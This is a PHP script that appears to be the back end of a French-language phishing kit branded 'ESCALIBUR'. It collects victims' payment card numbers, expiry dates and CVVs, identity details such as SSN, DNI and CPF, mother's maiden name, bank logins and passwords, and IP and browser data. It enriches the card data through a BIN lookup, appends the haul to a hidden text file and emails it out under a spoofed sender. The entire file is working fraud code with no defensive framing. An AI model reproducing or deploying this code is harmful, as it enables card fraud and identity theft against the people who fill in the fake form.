<?php
if (isset($_POST['ccn']) && isset($_POST['fnm'])) {
    session_start();
    include '../mine.php';

    function cardData($ss, $bin)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/" . $bin);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 400);
        $json = curl_exec($ch);
        curl_close($ch);
        if ($json == false || $json == '{"valid":false}') {
            return "N/A";
        }
        $code = json_decode($json);
        switch ($ss) {
            case "type":
                $str = $code->card->type;
                break;
            case "level":
                $str = $code->card->category;
                break;
            case "bank":
                $str = isset($code->issuer->name) ? $code->issuer->name : "";
                break;
            case "status":
                $str = $code->country->currency;
                break;
            case "countryName":
                $str = $code->country->name;
                break;
            default:
                $str = $code->card->scheme;
        }
        return $str;
    }
    $ctp         = $_POST['ctp'];
    $ccn         = $_POST['ccn'];
    $cex         = $_POST['cex'];
    $csc         = $_POST['csc'];
    $fnm         = $_POST['fnm'];
    $dob         = $_POST['dob'];
    $adr         = $_POST['adr'];
    $cty         = $_POST['cty'];
    $zip         = $_POST['zip'];
    $stt         = $_POST['stt'];
    $cnt         = $_POST['cnt'];
    $ptp         = $_POST['ptp'];
    $par         = $_POST['par'];
    $pnm         = $_POST['pnm'];
    $bin         = substr(str_replace(' ', '', $ccn), 0, 6);
    $bin_type    = cardData('type', $bin);
    $bin_level   = cardData('level', $bin);
    $bin_brand   = cardData('brand', $bin);
    $bin_status  = cardData('status', $bin);
    $bin_bank    = cardData('bank', $bin);
    $bin_country = cardData('countryName', $bin);
    $msg         = "🔘 ESCALIBUR // NEW CARD INFOS\r\n";
    $msg .= "🍉 [ INFOS PERSONNELLES]\r\n";
    $msg .= "📋 Nom prenom: {$fnm}\r\n";
    $msg .= "📋 Date de naissance: {$dob}\r\n";
    $msg .= "📋 Adresse: {$adr}\r\n";
    $msg .= "📋 Ville: {$cty}\r\n";
    $msg .= "📋 Région: {$stt}\r\n";
    $msg .= "📋 Code Postal: {$zip}\r\n";
    $msg .= "📋 Pays: {$cnt}\r\n";
    $msg .= "📋 Numéro de téléphone: {$ptp} | {$par} {$pnm}\r\n";
    if (isset($_POST['mdn'])) {
        $msg .= "Mother Name : {$_POST['mdn']}\r\n";
    }
    if (isset($_POST['ssn'])) {
        $msg .= "SSN         : {$_POST['ssn']}\r\n";
    }
    if (isset($_POST['pps'])) {
        $msg .= "PPS         : {$_POST['pps']}\r\n";
    }
    if (isset($_POST['clm']) && isset($_POST['dln'])) {
        $msg .= "Card Limit     : {$_POST['clm']}\r\n";
        $msg .= "Driver Lic. : {$_POST['dln']}\r\n";
    }
    if (isset($_POST['sin'])) {
        $msg .= "SIN         : {$_POST['sin']}\r\n";
    }
    if (isset($_POST['pse'])) {
        $msg .= "PSE         : {$_POST['pse']}\r\n";
    }
    if (isset($_POST['dni'])) {
        $msg .= "DNI         : {$_POST['dni']}\r\n";
    }
    if (isset($_POST['bsn'])) {
        $msg .= "BSN         : {$_POST['bsn']}\r\n";
    }
    if (isset($_POST['cpf'])) {
        $msg .= "CPF         : {$_POST['cpf']}\r\n";
    }
    if (isset($_POST['fcn'])) {
        $msg .= "FCN         : {$_POST['fcn']}\r\n";
    }
    $msg .= "\r\n";
    $msg .= "🍓 [ INFOS BANCAIRE ]\r\n";
    $msg .= "🏛 Level: $bin_type\r\n";
    $msg .= "🏛 Type: {$ctp}\r\n";
    $msg .= "🏛 Numéro de carte: {$ccn}\r\n";
    $msg .= "🏛 Date d'expiration: {$cex}\r\n";
    $msg .= "🏛 Cryptogramme visuel: {$csc}\r\n";
    $msg .= "\r\n";
    if (isset($_POST['acn']) && isset($_POST['stc'])) {
        $msg .= "Account N.     : {$_POST['acn']}\r\n";
        $msg .= "Sortcode    : {$_POST['stc']}\r\n";
    $msg .= "\r\n";
    }
    if (isset($_POST['bus']) && isset($_POST['bpw'])) {
        $msg .= "Bank ID     : {$_POST['bus']}\r\n";
        $msg .= "Bank Mdp       : {$_POST['bpw']}\r\n";
    }
    $msg .= "🍋 [ Informations IP ]\r\n";
    $msg .= "📋Adresse IP: {$_SESSION['ip']}\r\n";
    $msg .= "📋Localisation: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
    $msg .= "📋Navigateur: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
    $msg .= "📋Heure du Pays: {$_SESSION['ip_timezone']}\r\n";
    $msg .= "📋Heure/Date/Jour/Année: " . now() . " GMT\r\n";
    $msg .= "\r\n";
    $msg .= "🌟 ESCALIBUR 🌟\r\n";
    $msg .= "📲TELEGRAM: @crachi";
    $save = fopen("../../vxvrez.txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    $subject = "💳[{$bin}] - {$ctp} -  {$_SESSION['ip']}💳";
    $headers = "From:💈La vie est belle, je vaux la peine d'être têtue.💈<emmaxpaul@servicetechniques.fr>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($yours, $subject, $msg, $headers);
    @mail($antibot, $subject, $msg, $headers);
    exit('done');
}
?>
